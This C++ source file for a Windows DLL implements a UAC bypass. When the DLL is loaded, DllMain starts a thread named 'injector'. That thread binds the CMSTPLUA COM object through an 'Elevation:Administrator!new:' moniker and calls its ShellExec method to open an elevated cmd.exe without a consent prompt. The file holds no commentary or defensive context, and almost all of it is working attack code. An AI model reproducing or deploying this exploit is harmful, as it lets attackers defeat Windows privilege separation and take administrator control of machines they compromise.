#include "pch.h"
#include <shlobj.h>
#include <atlbase.h>
#include <shellapi.h> 

#pragma comment(lib, "shell32.lib") 

const wchar_t* CLSID_CMSTPLUA = L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
const wchar_t* IID_ICMLuaUtil = L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}";

//These are inherited from IUnknown
//HRESULT QueryInterface(REFIID riid, void** ppvObject);
//ULONG AddRef();
//ULONG Release();
struct ICMLuaUtil : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE Method1() = 0;
    virtual HRESULT STDMETHODCALLTYPE Method2() = 0;
    virtual HRESULT STDMETHODCALLTYPE Method3() = 0;
    virtual HRESULT STDMETHODCALLTYPE Method4() = 0;
    virtual HRESULT STDMETHODCALLTYPE Method5() = 0;
    virtual HRESULT STDMETHODCALLTYPE Method6() = 0;
    virtual HRESULT STDMETHODCALLTYPE ShellExec(
        LPCWSTR lpFile,
        LPCWSTR lpParameters,
        LPCWSTR lpDirectory,
        ULONG fMask,
        ULONG nShow) = 0;
};

int injector() {
    HRESULT hr, coi;
    CComPtr<ICMLuaUtil> spLuaUtil;
    WCHAR moniker[MAX_PATH] = L"Elevation:Administrator!new:";
    wcscat_s(moniker, CLSID_CMSTPLUA);

    CLSID clsid;
    IID iid;

    coi=CoInitialize(NULL);  // Use CoInitializeEx for apartment options if needed

    if (FAILED(CLSIDFromString(CLSID_CMSTPLUA, &clsid)) ||
        FAILED(IIDFromString(IID_ICMLuaUtil, &iid))) {
        CoUninitialize();
        return -1;
    }

    BIND_OPTS3 opts;
    ZeroMemory(&opts, sizeof(opts));
    opts.cbStruct = sizeof(opts);
    opts.dwClassContext = CLSCTX_LOCAL_SERVER;

    hr = CoGetObject(moniker, (BIND_OPTS*)&opts, iid, (void**)&spLuaUtil);
    if (SUCCEEDED(hr) && spLuaUtil) {
        spLuaUtil->ShellExec(
            L"C:\\Windows\\System32\\cmd.exe",
            nullptr,
            nullptr,
            SEE_MASK_DEFAULT,
            SW_SHOW);
    }

    CoUninitialize();
    return 0;
}

DWORD WINAPI ThreadProc(LPVOID lpParameter) {
    HMODULE hModule = (HMODULE)lpParameter;
    injector();
    FreeLibraryAndExitThread(hModule, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(nullptr, 0, ThreadProc, hModule, 0, nullptr);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}